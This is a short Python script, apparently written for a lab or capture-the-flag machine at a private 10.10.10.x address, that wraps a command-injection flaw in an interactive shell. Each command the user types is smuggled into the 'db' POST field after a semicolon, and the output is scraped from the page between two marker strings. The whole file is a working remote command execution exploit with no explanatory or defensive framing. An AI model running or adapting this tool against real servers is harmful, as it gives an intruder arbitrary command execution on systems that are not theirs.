import requests
import re
from cmd import Cmd

class Terminal(Cmd):
    prompt = 'Terminal = > '

    def default(self, args):
        output = RunCmd(args)
        print(output)

def RunCmd(cmd):
    data = {'db' : f'a; echo -n "Kyuuji"; {cmd}; echo -n "Was Here"' }
    r = requests.post('http://10.10.10.127/select', data=data)
    page = r.text
    m = re.search('Kyuuji(.*?)Was Here', page, re.DOTALL)
    if m:
        return(m.group(1))
    else:
        return(1)

term = Terminal()
term.cmdloop()
